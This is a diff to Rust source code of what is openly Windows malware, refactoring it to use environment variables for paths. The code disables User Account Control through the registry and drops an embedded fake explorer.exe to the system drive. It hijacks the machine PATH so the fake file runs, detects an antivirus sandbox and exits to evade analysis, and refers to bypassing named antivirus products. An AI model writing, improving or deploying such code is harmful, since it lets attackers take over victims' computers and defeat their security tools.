@@ -5,6 +5,7 @@ use std::io::{self, Write};
 use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_SET_VALUE};
 use winreg::RegKey;
 use std::fs;
+use std::env;
 
 fn disable_uac() -> io::Result<()> {
     // Open the registry key for User Account Control
@@ -101,8 +102,14 @@ fn is_admin() -> bool {
 }
 
 fn extract_embedded_exe() -> io::Result<()> {
+    // Retrieve the Program Files directory dynamically
+    let program_files = env::var("ProgramFiles").unwrap_or_else(|_| "C:\\Program Files".to_string());
+
+    // Create a long-lived value for the target directory path
+    let target_dir_str = format!("{}/utkudrk2", program_files);
+    let target_dir = Path::new(&target_dir_str);
+    
     // Ensure the target directory exists
-    let target_dir = Path::new("C:\\Program Files\\utkudrk2");
     if !target_dir.exists() {
         fs::create_dir_all(target_dir)?;
         println!("Created directory: {}", target_dir.display());
@@ -117,12 +124,17 @@ fn extract_embedded_exe() -> io::Result<()> {
     Ok(())
 }
 
-/// Extracts the embedded explorer.exe to "C:\explorer.exe"
 fn extract_explorer_exe() -> io::Result<()> {
-    // Define the target path for explorer.exe
-    let target_path = Path::new("C:\\explorer.exe");
+    // Retrieve the system drive (typically C:)
+    let system_drive = env::var("SystemDrive").unwrap_or_else(|_| "C:".to_string());
+
+    // Create a long-lived value for the target path
+    let target_path_str = format!("{}\\explorer.exe", system_drive);
+    let target_path = Path::new(&target_path_str);
+
     // Create (or overwrite) the file at the target path
     let mut file = File::create(&target_path)?;
+
     // Write the embedded executable data to the file
     file.write_all(include_bytes!("../resources/explorer.exe"))?;
     println!("Explorer executable saved to {}.", target_path.display());
@@ -155,25 +167,22 @@ fn execute_command(command: &str) {
     }
 }
 
-/// Sets the system PATH variable so that "C:\" is the first entry.
-/// This method reads the current PATH, and if it doesn't already begin with "C:\",
-/// it prepends "C:\" to the PATH and then uses 'setx /M' to update the machine PATH.
 fn set_system_path_first() -> io::Result<()> {
     // Retrieve the current PATH (this may be the user or process PATH)
-    let current_path = std::env::var("PATH").unwrap_or_default();
+    let current_path = env::var("PATH").unwrap_or_default();
     let parts: Vec<&str> = current_path.split(';').collect();
 
-    // Check if the first non-empty element is "C:\"
+    // Check if the first non-empty element is "%SystemDrive%\"
     if let Some(first) = parts.iter().find(|s| !s.trim().is_empty()) {
-        if first.trim().eq_ignore_ascii_case("C:\\") {
-            println!("[+] System PATH already starts with C:\\");
+        if first.trim().eq_ignore_ascii_case("%SystemDrive%\\") {
+            println!("[+] System PATH already starts with %SystemDrive%\\");
             return Ok(());
         }
     }
 
-    // Prepend "C:\" to the current PATH.
+    // Prepend "%SystemDrive%\" to the current PATH.
     // (Be sure to include a semicolon separator.)
-    let new_path = format!("C:\\;{}", current_path);
+    let new_path = format!("%SystemDrive%\\;{}", current_path);
     println!("[*] Setting system PATH to: {}", new_path);
 
     // Build and execute the command to update the machine PATH.
@@ -181,6 +190,27 @@ fn set_system_path_first() -> io::Result<()> {
     let command = format!("setx /M PATH \"{}\"", new_path);
     execute_command(&command);
     Ok(())
+}
+
+fn create_directory() -> io::Result<()> {
+    // Retrieve the Program Files directory dynamically
+    let program_files = env::var("ProgramFiles").unwrap_or_else(|_| "C:\\Program Files".to_string());
+
+    // Create a long-lived value for the directory path
+    let dir_path_str = format!("{}/utkudrk2", program_files);
+    let dir_path = Path::new(&dir_path_str);
+
+    // Step 2: Ensure the directory exists
+    match fs::create_dir_all(dir_path) {
+        Ok(_) => {
+            println!("Directory successfully created at: {}", dir_path.display());
+            Ok(())
+        }
+        Err(e) => {
+            eprintln!("Failed to create directory (Possible Avast CyberCapture Sandbox): {}", e);
+            Err(e) // Return the error to the caller
+        }
+    }
 }
 
 fn main() {
@@ -192,13 +222,14 @@ fn main() {
 
     println!("Admin privileges confirmed.");
 
-    //Define directory path
-    let dir_path = Path::new(r"C:\Program Files\utkudrk2");
-
-    // Step 2: Ensure the directory exists
-    if let Err(e) = fs::create_dir_all(dir_path) {
-        eprintln!("Failed to create directory (Possible Avast CyberCapture Sandbox): {}", e);
-        process::exit(0); // Exit the program with a success status
+    // Calling the create_directory function and checking for errors
+    if let Err(e) = create_directory() {
+        // Handle the error if the directory creation fails
+        eprintln!("Error creating directory: {}", e);
+        process::exit(0); // Exit the program with an success code to bypass malware analysis
+    } else {
+        // Directory creation was successful
+        println!("Directory was created without any issues.");
     }
 
     // Step 3: Kaspersky, Bitdefender, ESET, Avast etc. bypass (General Antivirus bypass)
@@ -227,7 +258,7 @@ fn main() {
         eprintln!("Error extracting embedded safe boot executable: {}", e);
     }
     
-    // Step 7: Use set system path first to redirict to C:\explorer.exe
+    // Step 7: Use set system path first to redirect to fake explorer.exe
     if let Err(e) = set_system_path_first() {
         eprintln!("Error setting system path: {}", e);
         return;
